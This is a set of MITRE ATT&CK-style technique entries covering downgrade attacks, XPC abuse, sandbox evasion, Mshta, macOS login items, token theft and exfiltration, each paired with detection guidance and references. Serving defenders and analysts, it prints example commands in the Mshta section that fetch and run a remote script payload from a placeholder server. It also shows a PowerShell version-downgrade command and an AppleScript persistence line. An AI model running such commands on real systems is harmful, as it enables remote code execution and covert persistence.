### Downgrade Attack
Adversaries may downgrade or use outdated versions of system features that are vulnerable and/or lack updated security controls, such as logging. For example, PowerShell versions 5 and later include Script Block Logging (SBL), which records executed script content. However, adversaries may attempt to execute an earlier version of PowerShell that does not support SBL to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that might otherwise be detected.

Adversaries may also downgrade and use less-secure versions of various system features, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or network protocols, which can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attacks.

**Detection:**
- Monitor for commands or activities that indicate attempts to abuse older or deprecated technologies (e.g., `powershell -v 2`).
- Monitor for abnormal events, such as the execution of and/or processes spawning from a version of a tool that is not expected in the environment.
- Monitor for Windows Event ID 400, specifically the `EngineVersion` field, which shows the version of PowerShell running and may highlight a malicious downgrade attack.

**References:**
- [CrowdStrike BGH Ransomware 2021](https://www.crowdstrike.com/blog/how-falcon-complete-stopped-a-big-game-hunting-ransomware-attack/)
- [Mandiant BYOL 2018](https://www.mandiant.com/resources/bring-your-own-land-novel-red-teaming-technique)
- [Praetorian TLS Downgrade Attack 2014](https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/)

---

### XPC Services
Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high-level NSXPCConnection API to handle tasks that require elevated privileges (such as network connections). Developers typically use XPC Services to provide applications with stability and privilege separation between the application client and the daemon.

Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).

**References:**
- [Creating XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW1)
- [CVMServer Vulnerability in macOS and iOS](https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html)
- [Learn XPC Exploitation](https://wojciechregula.blog/post/learn-xpc-exploitation-part-3-code-injections/)

---

### Virtualization/Sandbox Evasion
Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include the use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.

**Detection:**
- Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment.
- Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.
- Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.
- Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.

**References:**
- [Environment Awareness](https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc)
- [UPS: Observations on CVE-2015-3113, Prior Zero-Days and the Pirpi Payload](https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/)

---

### Web Service
Adversaries may use an existing, legitimate external web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Using web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

**Detection:**
- Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption.
- Packet capture analysis will require SSL/TLS inspection if data is encrypted.
- Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server).
- User behavior monitoring may help to detect abnormal patterns of activity.

**References:**
- [Command & Control Understanding, Denying and Detecting](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)

---

### Credentials In Files
Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.

**Detection:**
- While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained.
- Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials).
- See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.

**References:**
- [Mimikatz Against Virtual Machine Memory Part 1](http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html)
- [MS14-025: An Update for Group Policy Preferences](http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx)
- [Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes](https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/)
- [Attacker's Tactics and Techniques in Unsecured Docker Daemons Revealed](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/)
- [Head in the Clouds](https://posts.specterops.io/head-in-the-clouds-bd038bb69e48)

---

### DNS Calculation
Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.

One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.

**Detection:**
- Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm.
- Detection may be possible by analyzing DNS records if the algorithm is known.

**References:**
- [Whois Numbered Panda](http://www.crowdstrike.com/blog/whois-numbered-panda/)
- [Darwin’s Favorite APT Group](https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html)
- [Upcoming G20 Summit Fuels Espionage Operations](https://blog.rapid7.com/2013/08/26/upcoming-g20-summit-fuels-espionage-operations/)

---

### Mshta
Adversaries may abuse `mshta.exe` to proxy execution of malicious `.hta` files and JavaScript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging `mshta.exe` during initial compromise and for execution of code.

`Mshta.exe` is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.

Files may be executed by `mshta.exe` through an inline script:
```sh
mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
```
They may also be executed directly from URLs:
```sh
mshta http[:]//webserver/payload[.]hta
```

`Mshta.exe` can be used to bypass application control solutions that do not account for its potential use. Since `mshta.exe` executes outside of the Internet Explorer's security context, it also bypasses browser security settings.

**Detection:**
- Use process monitoring to monitor the execution and arguments of `mshta.exe`. Look for `mshta.exe` executing raw or obfuscated script within the command-line.
- Compare recent invocations of `mshta.exe` with prior history of known good arguments and executed `.hta` files to determine anomalous and potentially adversarial activity.
- Command arguments used before and after the `mshta.exe` invocation may also be useful in determining the origin and purpose of the `.hta` file being executed.
- Monitor use of HTA files. If they are not typically used within an environment, then execution of them may be suspicious.

**References:**
- [Operation Dust Storm](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)
- [Microsoft HTML Application (HTA) Abuse, Part Deux](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/)
- [CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)
- [Fileless Malware – A Behavioural Analysis Of Kovter Persistence](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/)
- [FIN7 Evolution and the Phishing LNK](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)
- [HTML Application](https://en.wikipedia.org/wiki/HTML_Application)
- [HTML Applications](https://msdn.microsoft.com/library/ms536471.aspx)
- [Mshta.exe](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

---

### Login Items
Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or the Service Management Framework. Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call `SMLoginItemSetEnabled`.

Login items installed using the Service Management Framework leverage `launchd`, are not visible in the System Preferences, and can only be removed by the application that created them. Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not `launchd`, to open applications, documents, or URLs without using Finder. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.

Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables. Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple event to the "System Events" process, which has an AppleScript dictionary for manipulating login items. Adversaries can use a command such as `tell application "System Events" to make login item at end with properties /path/to/executable`. This command adds the path of the malicious executable to the login item file list located in `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`. Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.

**Detection:**
- All login items created via shared file lists are viewable by using the System Preferences GUI or in the `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` file. These locations should be monitored and audited for known good applications.
- Otherwise, login items are located in `Contents/Library/LoginItems` within an application bundle, so these paths should be monitored as well.
- Monitor applications that leverage login items with either the `LSUIElement` or `LSBackgroundOnly` key in the `Info.plist` file set to `true`.
- Monitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior, such as establishing network connections.

**References:**
- [Open items automatically when you log in on Mac](https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac)
- [Adding Login Items](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html)
- [SMLoginItemSetEnabled Demystified](https://blog.timschroeder.net/2013/04/21/smloginitemsetenabled-demystified/)
- [Launch Services](https://developer.apple.com/documentation/coreservices/launch_services)
- [Running at startup: when to use a Login Item or a LaunchAgent/LaunchDaemon](https://eclecticlight.co/2018/05/22/running-at-startup-when-to-use-a-login-item-or-a-launchagent-launchdaemon/)
- [Login Items AE](https://developer.apple.com/library/archive/samplecode/LoginItemsAE/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003788)
- [How to run an app or tool at startup](https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/)
- [OSX.Dok Analysis](http://www.hexed.in/2019/07/osxdok-analysis.html)
- [macos: manage add list remove login items apple script](https://gist.github.com/kaloprominat/6111584)
- [Mac Malware of 2017](https://objective-see.com/blog/blog_0x25.html)
- [OSX Malware is Catching Up, and it wants to Read Your HTTPS Traffic](https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/)
- [Burned by Fire(fox)](https://objective-see.com/blog/blog_0x44.html)
- [Block Blocking Login Items](https://objective-see.com/blog/blog_0x31.html)
- [HOW MALWARE PERSISTS ON MACOS](https://www.sentinelone.com/blog/how-malware-persists-on-macos/)
- [Launch Services Keys](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/LaunchServicesKeys.html#//apple_ref/doc/uid/TP40009250-SW1)

---

### Stage Capabilities
Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.

Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):
- Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.
- Staging web resources for a link target to be used with spearphishing.
- Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).
- Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (e.g., [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).

**Detection:**
- If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.
- Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors.

**References:**
- [OceanLotus: Extending Cyber Espionage Operations Through Fake Websites](https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/)
- [Targeted Attacks Abusing Google Cloud Platform Open Redirection](https://www.netskope.com/blog/targeted-attacks-abusing-google-cloud-platform-open-redirection)
- [A Big Catch: Cloud Phishing from Google App Engine and Azure App Service](https://www.netskope.com/blog/a-big-catch-cloud-phishing-from-google-app-engine-and-azure-app-service)
- [Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)
- [How to Install an SSL Certificate](https://www.digicert.com/kb/ssl-certificate-installation.htm)
- [Newly discovered Chinese hacking group hacked 100+ websites to use as “watering holes”](http://arstechnica.com/security/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/)
- [There's an app for that: web skimmers found on PaaS Heroku](https://www.malwarebytes.com/blog/news/2019/12/theres-an-app-for-that-web-skimmers-found-on-paas-heroku)
- [When Intrusions Don’t Align: A New Water Watering Hole and Oldsmar](https://www.dragos.com/blog/industry-news/a-new-water-watering-hole/)
- [CFR Watering Hole Attack Details](https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html)
- [Silent Librarian APT right on schedule for 20/21 academic year](https://blog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attack/)
- [Threat Actor Profile: TA407, the Silent Librarian](https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian)

---

### Link Target
Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link.

Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003). Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.

Adversaries may purchase domains similar to legitimate domains (e.g., homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked. Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.

**Detection:**
- If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.
- Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003), [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002), or [Malicious Link](https://attack.mitre.org/techniques/T1204/001).

**References:**
- [Targeted Attacks Abusing Google Cloud Platform Open Redirection](https://www.netskope.com/blog/targeted-attacks-abusing-google-cloud-platform-open-redirection)
- [A Big Catch: Cloud Phishing from Google App Engine and Azure App Service](https://www.netskope.com/blog/a-big-catch-cloud-phishing-from-google-app-engine-and-azure-app-service)
- [Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns](https://blog.talosintelligence.com/ipfs-abuse/)
- [Silent Librarian APT right on schedule for 20/21 academic year](https://blog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attack/)
- [Kud I Enter Your Server? New Vulnerabilities in Microsoft Azure](https://www.intezer.com/blog/malware-analysis/kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure/)
- [Threat Actor Profile: TA407, the Silent Librarian](https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian)

---

### Multi-Stage Channels
Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.

**Detection:**
- Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure.
- Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.

---

### Execution Guardrails
Adversaries may use execution guardrails to constrain execution or actions based on adversary-supplied and environment-specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduce collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.

**Detection:**
- Detecting the use of guardrails may be difficult depending on the implementation.
- Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.

**References:**
- [Breaking the Rules: A Tough Outlook for Home Page Attacks (CVE-2017-11774)](https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html)
- [Playing nice? FireEye CEO says U.S. malware is more restrained than adversaries'](https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/)

---

### Cloud Storage Object Discovery
Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage. Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e., [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)), adversaries may access the contents/objects stored in cloud infrastructure.

Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include `ListObjectsV2` in AWS and `List Blobs` in Azure.

**Detection:**
- System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.
- Monitor cloud logs for API calls used for file or object enumeration for unusual activity.

**References:**
- [ListObjectsV2](https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjectsV2.html)
- [List Blobs](https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs)

---

### Web Cookies
Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.

Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.

Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.

**Detection:**
- Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts.
- Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.

**References:**
- [Pivot to the Cloud using Pass the Cookie](https://wunderwuzzi23.github.io/blog/passthecookie.html)
- [Dark Halo Leverages SolarWinds Compromise to Breach Organizations](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)
- [Mac Malware Steals Cryptocurrency Exchanges’ Cookies](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)

---

### Token Impersonation/Theft
Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged-on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.

**Detection:**
- If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the `runas` command. Detailed command-line logging is not enabled by default in Windows.
- Analysts can also monitor for use of Windows APIs such as `DuplicateToken(Ex)`, `ImpersonateLoggedOnUser`, and `SetThreadToken` and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.

**References:**
- [Command line process auditing](https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing)

---

### Exfiltration to Code Repository
Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (e.g., https://api.github.com). Access to these APIs is often over HTTPS, which gives the adversary an additional level of protection.

Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.

**Detection:**
- Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories.
- Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.
- User behavior monitoring may help to detect abnormal patterns of activity.